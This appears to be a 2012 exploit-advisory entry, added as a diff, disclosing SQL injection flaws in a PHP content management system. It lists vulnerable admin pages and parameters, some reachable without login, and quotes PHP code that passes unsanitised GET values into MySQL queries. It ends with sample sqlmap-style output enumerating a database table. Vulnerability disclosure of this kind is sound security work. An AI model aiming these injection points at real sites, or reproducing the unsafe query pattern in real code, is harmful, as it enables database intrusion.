@@ -1,0 +1,120 @@
+######################################################################################
+# Exploit Title: Simple Web Content Management System SQL Injection
+# Date: May 30th 2012
+# Author: loneferret
+# Version: 1.1 & 1.3
+# Application Url: http://www.cms-center.com/
+# Tested on: Ubuntu Server 8.04 / PHP Version 5.2.4-2ubuntu5.23
+######################################################################################
+# Discovered by: loneferret
+######################################################################################
+
+# Side note:
+# This application is nothing fancy, and really shouldn't be used other than
+# for practicing SQLi. Pretty much every page has at least one (1) vulnerable 
+# parameter.
+
+# Vulnerability:
+# Due to improper input sanitization, many parameters are prone to SQL injection.
+# Most of them require to be authenticated with an account (admin).
+# But there are a few pages that will cause an error without having to logon.
+
+
+# PoC 1:
+# No Authentication Required.
+# Page: /admin/item_delete.php?id=[SQLi]
+# Vulnerable Parameter: id
+# Code:
+15      $id = $_GET['id'];
+16      $title = NULL;
+17      $text = NULL;
+18      database_connect();
+19      $query = "select title,text from content where id = $id;";
+20      //echo $query;
+21      $result = mysql_query($query);
+
+# As stated, nothing is checked before passing "id" to MySql.
+# This results in a MySql error.
+
+
+
+# PoC 2:
+# No Authentication Required.
+# Page: /admin/item_status.php?id=[SQLi]&status=1
+# Page: /admin/item_status.php?id=1&status=[SQLi]
+# Vulnerable Parameter: id & status
+# Code:
+10	$ref = $_GET['ref'];
+11	$id = $_GET['id'];
+12	$status = $_GET['status'];
+13	$update = "UPDATE content
+14			SET status='$status'
+15			WHERE id='$id'"; 
+16	$query = mysql_query($update)
+		or die("Their was a problem updating the status: ". mysql_error()); 
+
+# As stated, nothing is checked before passing "id" and/or "status" to MySql.
+# This results in a MySql error.
+
+
+
+# PoC 3:
+# Authentication Required.
+# Page: /admin/item_detail.php?id=[SQLi]
+# Vulnerable Parameter: id
+# Code:
+15     $id = $_GET['id'];
+16     $title = NULL;
+17     $text = NULL;
+18     database_connect();
+19     $query = "select title,text from content where id = $id;";
+20     //echo $query;
+21     $result = mysql_query($query);
+
+# As stated, nothing is checked before passing "id" to MySql.
+# This results in a MySql error.
+
+
+# PoC 4:
+# Authentication Required.
+# Page: /admin/item_modify.php?id=[SQLi]
+# Vulnerable Parameter: id
+# Code:
+60	database_connect();		
+61	if(isset($_GET['id'])) {
+62		$id = ($_GET['id']);
+63	}
+64	$select = "SELECT *
+65			FROM content
+66			where id = '$id'";
+67	$query = mysql_query($select);
+
+# As stated, nothing is checked before passing "id" to MySql.
+# This results in a MySql error.
+
+# PoC 6:
+# Authencitation Required.
+# Page: /admin/item_position.php?id=[SQLi]&mode=up
+# Vulnerable Parameter: id
+.
+...ok I think we get the idea now.
+.
+.
+#		
+# Example output:
+#
+[19:40:22] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL 5.0
+[19:40:22] [INFO] fetching tables for database: phpcms
+[19:40:22] [INFO] heuristics detected web page charset 'ascii'
+[19:40:22] [INFO] the SQL query used returns 1 entries
+[19:40:22] [INFO] retrieved: content
+Database: phpcms
+[1 table]
++---------+
+| content |
++---------+
+
+
+
+
